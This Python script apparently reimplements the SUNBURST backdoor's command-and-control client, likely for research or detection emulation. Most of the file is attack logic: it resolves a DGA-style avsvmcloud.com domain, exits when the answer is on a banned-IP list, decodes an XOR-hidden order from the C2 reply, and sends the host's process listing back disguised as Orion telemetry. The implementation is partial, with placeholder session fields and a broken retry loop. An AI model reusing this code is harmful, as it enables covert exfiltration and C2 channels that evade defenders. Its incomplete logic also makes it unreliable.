import os
import socket
import sys
import requests
import random
import time
import binascii
import re
import psutil
import json
import base64

from dns import resolver
from datetime import datetime
from psutil import AccessDenied

domain_name = "i32hu6i32hu6.appsync-api.us-east-2.avsvmcloud.com" # = output of DGA algo

ban_ip = [
    "10.0.0.0",
    "172.16.0.0",
    "192.168.0.0",
    "224.0.0.0",
    "20.140.0.0",
    "96.31.172.0",
    "131.228.12.0",
    "144.86.226.0",
    ]

ban_ip_range = [["fc00", "fe00"], ["fec0", "ffc0"], ["ff00", "ff00"]]


def execute_order_66(order): # :)
  """
  execute order from the c2 server
  Only the order nÂ°6 can be execute now : Returns a process listing. If no arguments are provided returns just the PID and process name.
  """
  if order != str(6):
    sys.exit(0)

  dico_process =  {}
  for proc in psutil.process_iter():
      try:
          dico_process[proc.name().split(".")[0].lower()] = proc.pid # it's necessary to split in order to remove potentially ".exe"

      except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
          pass

  return json.dumps(dico_process)

def main():

  ## Finding 'A' Record
  try:
    result_a_query = resolver.query(domain_name, 'A')
    for result in result_a_query:
      ip_dga = result.to_text()
  except Exception as e:
    print("Error A request ", e)
    sys.exit(0)


  print("A record for IP fom DGA : ", ip_dga)

  stop = False
  if ":" not in ip_dga:
    if ip_dga in ban_ip:
      stop=True

  else:
    for [min_ip, max_ip] in ban_ip_range:
      if ip_dga[:4] >= min_ip and ip_dga[:4] <= max_ip:
        stop=True

  if stop == True:
    print("STOP, detection of a banned IP")
    sys.exit(0)


  ##Finding CNAME Value
  try:
    result_cname_query = resolver.query(domain_name, 'CNAME')
    for result in result_cname_query:
      domain_name_c2 = result.to_text()
    print("Domain Name C2 Server : ", domain_name_c2)

  except Exception as e:
    print("Error CNAME request ", e)
    pass


  ## First HTTP request with C2 server
  url="http://0.0.0.0:5000"
  first_request = requests.get(url)

  while first_request.status_code != 200:
    print("Http request failed : ", first_request.status_code)
    time.sleep(random.randint(10,20))

  print("Http request succeed")

  ## HTTP 2nd request : get order from C2 server
  Timestamp = int(datetime.timestamp(datetime.now()))

  Message=""

  data_send = { # the structure here is not good, cf the second http post request
    "EventType":"Orion",
    "EventName":"EventManager",
    "steps":{
      "Timestamp":Timestamp,
      "Message":Message
      }
    }

  second_request = requests.post(url+"/", json = data_send)
  body_request = second_request.text

  regex_list = re.findall(r"""[0-9a-f-]{36}|[0-9a-f]{32}|[0-9a-f]{16}""", body_request)
  print("Strings found with regex : ", regex_list)

  regex_string = "".join([k.replace("-", "") for k in regex_list])

  first_byte_message = ord("a") # necessary to change that, the first byte may not be the same

  message_hex = binascii.unhexlify(regex_string.encode("ISO-8859-1")).decode("ISO-8859-1")
  unxored_message = "".join([chr(ord(cs) ^ first_byte_message) for cs in message_hex])

  command = binascii.unhexlify(unxored_message[4:6]).decode("ISO-8859-1")

  print("The number of the order sent by the C2 server is : ", command)

  ## HTTP last request : send data requested by C2 server

  string_to_send = execute_order_66(command)

  print("The malware send this data : ", string_to_send)

  string_to_send = string_to_send

  answer_malware_string = binascii.hexlify(string_to_send.encode("ISO-8859-1")).decode("ISO-8859-1")
  xor_byte = ord("a") # what is this byte in the malware ?
  answer_message_xor = "".join([chr(ord(cs) ^ xor_byte) for cs in answer_malware_string])

  list_message_to_c2 = []
  for k in range(0, len(answer_message_xor), 10):
    list_message_to_c2.append(base64.b64encode(bytes(answer_message_xor[k:k+10], 'utf-8')))

  step_list = []
  for message_instance in range(len(list_message_to_c2)):
    step_list.append(  # cf pictures in https://www.mandiant.com/resources/sunburst-additional-technical-details
      {
        "Index":message_instance,
        "Succeeded": str(True),
        "Timestamp": str(int(datetime.timestamp(datetime.now()))),
        "DurationMs": str(0),
        "EventName": "EventManager",
        "EventType": "Orion",
        "Message": str(list_message_to_c2[message_instance])
      }
    )

  print("Example step list send: ", step_list[0])

  data_total_to_c2 = {
    "sessionID":"to_complete", # i don't how how this hash is created !
    "userID":"to_complete",
    "steps": step_list
    }

  last_request = requests.post(url+"/", json = data_total_to_c2)
  if (second_request.status_code == 200):
    print("Data requested has been send to C2 server :) ")

  else:
    print("error when sending the data requested by the C2 server")

if __name__=="__main__":
  main()
  sys.exit(0)



